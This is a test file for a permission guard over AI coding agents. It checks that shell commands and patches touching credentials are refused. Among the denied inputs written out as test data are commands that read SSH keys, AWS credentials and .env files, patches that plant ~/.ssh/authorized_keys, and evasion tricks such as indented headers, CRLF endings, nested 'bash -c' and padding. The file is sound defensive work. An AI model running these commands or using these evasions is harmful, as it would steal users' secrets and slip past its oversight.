    // The shell's credential scan is fleet-wide too: an agent with no row in
    // the table, such as OpenCode's own build, is checked like one with a row.
    for (const agent of ["build", "general", "coder"]) {
      expectDenied(shell(agent, "cat ~/.ssh/id_rsa"), "credential")
      expectDenied(shell(agent, 'bash -c "cat ~/.aws/credentials"'), "credential")
      expectDenied(shell(agent, "cat op/token", "/home/someone/.config"), "credential")
      expectDenied(bash(agent, "cat .env"), "credential")
    }
    expect(shell("build", "cat README.md")).toBeUndefined()
    // An ordinary workdir and an ordinary file are left alone.
    expect(shell("coder", "cat README.md", "/home/someone/.config")).toBeUndefined()
    expect(shell("coder", "cat op/token", "/repo/src")).toBeUndefined()
  })

  test("a credential workdir is refused even when every word is an absolute path", () => {
    // `/bin/ls` resolves to itself from any workdir, so only the workdir can
    // name the credential directory the command runs in.
    for (const agent of ["coder", "build"]) {
      for (const workdir of ["~/.ssh", "/home/u/.gnupg", "~/.config/op"]) {
        expectDenied(shell(agent, "/bin/ls", workdir), "credential")
      }
    }
  })

  test("a relative workdir is resolved from the project before it is judged", () => {
    const from = (directory: string, workdir: string) =>
      decide({ agent: "coder", tool: "shell", args: { command: "/bin/ls", workdir }, directory })
    expectDenied(from("/home/u/.config", "op"), "credential")
    expectDenied(from("/home/u/.ssh/proj", ".."), "credential")
    expect(from("/home/u/proj", "src")).toBeUndefined()
  })
})

describe("a patch's paths are read the way OpenCode 2.x's patch parser reads them", () => {
  // The parser trims each line before matching a header, and an Update File
  // header may be followed by `*** Move to: <path>`, which moves the file
  // there. Every path a patch can write is a target path.
  const patch = (agent: string, body: string) =>
    call(agent, "patch", { patchText: `*** Begin Patch\n${body}\n*** End Patch` })

  test("an indented header is still a header", () => {
    expectDenied(patch("coder", "  *** Add File: .npmrc\n+x"), "credential")
    expectDenied(patch("coder", "\t*** Update File: .env\n@@\n-a\n+b"), "credential")
    expectDenied(patch("coder", " *** Delete File: ~/.ssh/id_rsa"), "credential")
    expectDenied(patch("spec-writer", "  *** Add File: src/x.ts\n+x"), "docs/specs")
  })

  test("a Move to destination is a target path", () => {
    expectDenied(patch("coder", "*** Update File: notes.md\n*** Move to: ~/.ssh/authorized_keys\n@@\n-a\n+b"), "credential")
    expectDenied(patch("spec-writer", "*** Update File: docs/specs/a.md\n*** Move to: src/a.md\n@@\n-a\n+b"), "docs/specs")
    expectDenied(patch("refuter", "*** Update File: /tmp/r/a.md\n*** Move to: src/a.md\n@@\n-a\n+b"), "inside")
    expect(patch("spec-writer", "*** Update File: docs/specs/a.md\n*** Move to: docs/specs/b.md\n@@\n-a\n+b")).toBeUndefined()
  })

  test("lines are split and trimmed exactly as OpenCode does it", () => {
    // OpenCode splits only on \n and trims with String.prototype.trim, which
    // also removes \r, U+2028, U+2029 and U+00A0. A regex `.` or a multiline
    // `^` and `$` breaks on some of those and would read a different path.
    expectDenied(patch("coder", "*** Add File:  ~/.ssh/authorized_keys\n+x"), "credential")
    expectDenied(patch("coder", " *** Add File: .npmrc\n+x"), "credential")
    expectDenied(patch("coder", " *** Add File: .npmrc\n+x"), "credential")
    expectDenied(patch("coder", "*** Add File: .npmrc \n+x"), "credential")
    expectDenied(patch("coder", "\t\t*** Add File: .netrc\r\n+x\r"), "credential")
  })

  test("a header OpenCode would not read as one, or one with no path, is refused whole", () => {
    // Fail closed: a line that is trying to be a header and is not one exactly
    // is a patch this check cannot read, whatever path it seems to name.
    for (const body of ["*** Add File:.npmrc\n+x", "***  Add File: .npmrc\n+x", "*** add file: .npmrc\n+x", "*** Add File: \n+x", "*** Update File: a.md\n*** Move to:\n@@\n-a\n+b", "*** Update File: a.md\n*** Move to:src/a.md\n@@\n-a\n+b", "*** Delete File:   "]) {
      for (const agent of ["coder", "build"]) expectDenied(patch(agent, body), "cannot be read")
    }
    // An ordinary patch is not refused.
    expect(patch("coder", "*** Update File: src/a.ts\n@@\n-a\n+b")).toBeUndefined()
    expect(patch("coder", "*** Add File: src/b.ts\n+*** not a header, a line of content")).toBeUndefined()
  })

  test("CRLF line endings do not hide a path", () => {
    expectDenied(patch("coder", "*** Add File: .netrc\r\n+x\r"), "credential")
    expectDenied(patch("spec-writer", "*** Update File: docs/specs/a.md\r\n*** Move to: src/a.md\r\n@@\r\n-a\r\n+b\r"), "docs/specs")
  })
})

describe("the parsers, where the fleet recorded what getting them wrong cost", () => {
  test("recovery finds every sibling payload in one pass", () => {
    const found = recoverInterpreterPayloads(`bash -c "git status" && sh -c 'git push --force'`)
    expect(found).toContain("git status")
    expect(found).toContain("git push --force")
  })

  test("an unterminated quote is left alone, because no shell will run it", () => {
    expect(bash("coder", 'bash -c "git push --force')).toBeUndefined()
  })

  test("a long command is bounded rather than scanned forever, and its head is still read", () => {
    // Truncating is not skipping: the head is still scanned, so padding after a
    // banned verb does not hide it. A verb PAST the bound is the price.
    expectDenied(bash("coder", "git push --force && " + "x".repeat(20000)), "force-push")
  })

  test("an agent with no row in the table is not governed by it", () => {
    // The primary session runs as `build`, and these rules are per-agent.
    expect(bash("build", "git push --force")).toBeUndefined()
  })
})
